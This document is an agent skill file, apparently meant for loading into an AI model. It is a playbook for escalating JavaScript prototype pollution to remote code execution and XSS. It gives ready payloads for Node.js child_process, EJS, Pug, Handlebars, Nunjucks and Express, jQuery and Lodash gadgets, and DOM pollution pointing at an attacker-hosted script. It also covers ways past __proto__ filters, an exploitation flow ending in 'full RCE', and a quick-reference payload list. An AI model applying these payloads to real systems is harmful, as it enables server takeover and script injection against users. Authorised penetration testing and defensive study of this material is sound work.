---
name: prototype-pollution-advanced
description: >-
  Advanced prototype pollution playbook — server-side RCE, client-side gadgets, filter bypasses, and detection techniques. Companion to ../prototype-pollution/ for basics. Use when you've confirmed pollution and need to escalate to code execution or find framework-specific gadgets.
---

# SKILL: Prototype Pollution Advanced — RCE & Gadget Exploitation

> **AI LOAD INSTRUCTION**: Advanced prototype pollution escalation. Covers server-side RCE via template engines (EJS, Pug, Handlebars), Node.js child_process gadgets, client-side script gadgets, filter bypass patterns, and systematic detection. Load [../prototype-pollution/SKILL.md](../prototype-pollution/SKILL.md) first for fundamentals (merge sinks, `__proto__` vs `constructor.prototype`, basic probes).

## 0. RELATED ROUTING

- [prototype-pollution](../prototype-pollution/SKILL.md) — **LOAD FIRST** for PP fundamentals, merge-sink detection, basic probes
- [ssti-server-side-template-injection](../ssti-server-side-template-injection/SKILL.md) — template engine RCE context (PP often triggers through template gadgets)
- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) — client-side PP gadgets ultimately achieve XSS

### Advanced Reference

Load [KNOWN_GADGETS.md](./KNOWN_GADGETS.md) for the comprehensive gadget table by framework/library with polluted properties, trigger conditions, impact, and affected versions.

---

## 1. SERVER-SIDE PP → RCE

### 1.1 Node.js child_process.spawn — Shell/ENV Injection

When `child_process.spawn` or `child_process.fork` is called without explicit `env`/`shell` options, it inherits from `Object.prototype`:

```javascript
// Vulnerable pattern (very common):
const { execSync } = require('child_process');
execSync('ls');  // inherits shell, env from prototype

// Pollution for RCE:
Object.prototype.shell = '/proc/self/exe';
Object.prototype.argv0 = 'console.log(require("child_process").execSync("id").toString())//';
Object.prototype.NODE_OPTIONS = '--require /proc/self/cmdline';
// Next child_process call executes attacker code
```

Alternative ENV pollution:

```json
{"__proto__": {"shell": "node", "NODE_OPTIONS": "--require /proc/self/cmdline"}}
```

### 1.2 EJS (Embedded JavaScript Templates)

EJS `render()` reads `opts` from object properties. Polluting `outputFunctionName` injects code into the compiled template function:

```json
// Pollution payload:
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}

// When EJS renders ANY template after pollution:
// Compiled function includes: var x;process.mainModule.require('child_process').execSync('id');s = "";
// → RCE
```

Detection: any EJS `res.render()` call after pollution triggers it.

### 1.3 Pug (formerly Jade)

Pug's compiler reads `block` from object properties:

```json
{"__proto__": {"block": {"type": "Text", "val": "x]);process.mainModule.require('child_process').execSync('id');//"}}}
```

Alternative via `self` option:

```json
{"__proto__": {"self": true, "line": "x]});process.mainModule.require('child_process').execSync('id');//"}}
```

### 1.4 Handlebars

Handlebars template compilation checks `type` and `program` on template AST nodes:

```json
{"__proto__": {"type": "Program", "body": [{"type": "MustacheStatement", "path": {"type": "PathExpression", "original": "constructor.constructor('return process.mainModule.require(`child_process`).execSync(`id`)')()","parts": ["constructor","constructor"]}, "params": [], "hash": null}]}}
```

Simpler via `allowProtoMethodsByDefault`:

```json
{"__proto__": {"allowProtoMethodsByDefault": true, "allowProtoPropertiesByDefault": true}}
// Then use {{#with this as |obj|}}{{obj.constructor.constructor "return process.mainModule.require('child_process').execSync('id')"}}{{/with}}
```

### 1.5 Nunjucks

```json
{"__proto__": {"type": "Code", "value": "global.process.mainModule.require('child_process').execSync('id')"}}
```

### 1.6 Express res.render (Generic)

When Express calls `res.render()`, options merge with `app.locals` and `res.locals`. Polluted prototype properties appear as template variables:

```json
{"__proto__": {"view options": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}}
```

---

## 2. CLIENT-SIDE PROTOTYPE POLLUTION

### 2.1 jQuery Gadgets

`$.extend(true, {}, userInput)` performs deep merge — classic PP sink.

After pollution, jQuery's HTML methods use polluted properties:

```javascript
// Pollution:
Object.prototype.innerHTML = '<img src=x onerror=alert(1)>';

// Trigger: any jQuery DOM manipulation that reads innerHTML from prototype
$('<div>').appendTo('body');  // may use polluted property
```

### 2.2 Lodash Gadgets

```javascript
// Vulnerable functions (deep merge):
_.merge({}, userInput)
_.defaultsDeep({}, userInput)
_.set(obj, path, value)  // if path is attacker-controlled

// template() gadget:
Object.prototype.sourceURL = '\u000ajavascript:alert(1)//';
_.template('hello')();  // sourceURL injected into Function constructor
```

### 2.3 Script Gadgets in Frameworks

"Script gadgets" are framework code paths that read from `Object.prototype` and perform dangerous operations:

| Framework | Gadget Pattern | Polluted Property | Impact |
|---|---|---|---|
| jQuery | `$.html()`, element creation | `innerHTML`, `src` | XSS |
| Angular.js | `$interpolate` | `__defineGetter__` | XSS |
| Vue.js | Template compilation | `template`, `render` | XSS |
| Ember.js | Component rendering | Various view properties | XSS |
| Backbone.js | `_.template` | `sourceURL` | XSS |

### 2.4 DOM Property Pollution

```javascript
Object.prototype.src = 'https://attacker.com/evil.js';
Object.prototype.href = 'javascript:alert(1)';
Object.prototype.action = 'https://attacker.com/phish';
// Any dynamically created element may inherit these
```

---

## 3. DETECTION TECHNIQUES

### 3.1 Black-Box Server-Side Detection

```
Step 1: Inject and check
  POST /api/endpoint
  {"__proto__":{"polluted":"yes"}}
  
  Then: GET /api/anything
  Check if response contains "polluted" or behavior changes

Step 2: Error-based detection
  {"__proto__":{"toString":1}}
  → If server crashes or returns 500, toString was overwritten
  
  {"__proto__":{"valueOf":1}}
  → Same crash-based detection

Step 3: Response differential
  {"__proto__":{"status":555}}
  → Check if HTTP status code changes to 555
  
  {"__proto__":{"content-type":"text/plain"}}
  → Check if Content-Type header changes
```

### 3.2 Black-Box Client-Side Detection

```javascript
// In browser console after interacting with the app:
Object.prototype.testPollution
// If returns a value → something polluted the prototype

// Automated: override defineProperty to detect writes
Object.defineProperty(Object.prototype, '__proto__', {
    set: function(v) { console.trace('PP detected!', v); }
});
```

### 3.3 Automated Tools

| Tool | Type | Purpose |
|---|---|---|
| **PPScan** | Burp Extension | Scans for server-side PP |
| **server-side-prototype-pollution** | Burp Extension (Gareth Heyes) | Advanced server-side PP detection with multiple techniques |
| **ppfuzz** | CLI | Fuzz for client-side PP via URL fragment/query |
| **ppmap** | CLI | Map client-side PP to known gadgets |

---

## 4. BYPASS `__proto__` FILTERS

### 4.1 constructor.prototype Path

```json
// Instead of:
{"__proto__": {"polluted": "yes"}}

// Use:
{"constructor": {"prototype": {"polluted": "yes"}}}
```

### 4.2 Bracket Notation Variants

```
?constructor[prototype][polluted]=yes
?__proto__[polluted]=yes
?__pro__proto__to__[polluted]=yes   (if filter strips __proto__ once)
```

### 4.3 JSON Key Variations

```json
{"__proto__": {"a": 1}}
{"constructor": {"prototype": {"a": 1}}}
{"__proto__\u0000": {"a": 1}}
```

### 4.4 Key Distinction: Shallow vs Deep

`Object.assign` does NOT pollute prototype (shallow copy, safe). Only recursive/deep merge functions are vulnerable. Always verify the merge depth.

---

## 5. EXPLOITATION FLOW

```
1. Find merge sink (../prototype-pollution/SKILL.md Section 0)
   └── JSON body parsed and deep-merged into server object

2. Confirm pollution:
   └── {"__proto__":{"testxyz":"1"}} → check if testxyz appears globally

3. Identify technology stack:
   ├── Express + EJS → outputFunctionName gadget (Section 1.2)
   ├── Express + Pug → block gadget (Section 1.3)
   ├── Express + Handlebars → type/program gadget (Section 1.4)
   ├── Any Node.js with child_process → shell/NODE_OPTIONS (Section 1.1)
   ├── Client-side jQuery → DOM gadgets (Section 2.1)
   ├── Client-side Lodash → template/sourceURL (Section 2.2)
   └── Unknown → try KNOWN_GADGETS.md systematically

4. Craft RCE/XSS payload matching gadget

5. Verify with safe payload first (sleep / DNS callback)

6. Escalate to full RCE
```

---

## 6. DECISION TREE

```
Confirmed prototype pollution?
│
├── Server-side or client-side?
│   │
│   ├── SERVER-SIDE
│   │   ├── Template engine in use?
│   │   │   ├── EJS → __proto__.outputFunctionName (Section 1.2)
│   │   │   ├── Pug → __proto__.block (Section 1.3)
│   │   │   ├── Handlebars → __proto__.type (Section 1.4)
│   │   │   ├── Nunjucks → __proto__.type (Section 1.5)
│   │   │   └── Unknown → try each gadget from KNOWN_GADGETS.md
│   │   │
│   │   ├── child_process used anywhere?
│   │   │   ├── YES → __proto__.shell + NODE_OPTIONS (Section 1.1)
│   │   │   └── MAYBE → inject and trigger error to reveal stack
│   │   │
│   │   └── No known gadget?
│   │       ├── Try status code pollution: __proto__.status = 555
│   │       ├── Try header pollution: __proto__.content-type
│   │       └── Check KNOWN_GADGETS.md for framework match
│   │
│   └── CLIENT-SIDE
│       ├── jQuery loaded?
│       │   ├── YES → $.extend deep merge + DOM gadgets (Section 2.1)
│       │   └── Check ppmap for automated gadget detection
│       │
│       ├── Lodash loaded?
│       │   ├── YES → _.template sourceURL gadget (Section 2.2)
│       │   └── _.merge as both sink AND gadget
│       │
│       └── Framework (Angular/Vue/Ember)?
│           └── Script gadget lookup (Section 2.3)
│
├── __proto__ keyword filtered?
│   ├── Try constructor.prototype (Section 4.1)
│   ├── Try bracket notation (Section 4.2)
│   └── Try JSON key variations (Section 4.3)
│
└── Not confirmed yet?
    └── Go back to ../prototype-pollution/SKILL.md for detection
```

---

## 7. QUICK REFERENCE — KEY PAYLOADS

```json
// EJS RCE
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');s"}}

// Pug RCE
{"__proto__":{"block":{"type":"Text","val":"x]);process.mainModule.require('child_process').execSync('id');//"}}}

// child_process RCE (Node.js)
{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/cmdline"}}

// Lodash template XSS
{"__proto__":{"sourceURL":"\u000ajavascript:alert(1)//"}}

// Filter bypass (constructor path)
{"constructor":{"prototype":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');s"}}}

// Safe detection probe
{"__proto__":{"pptest123":"polluted"}}
```
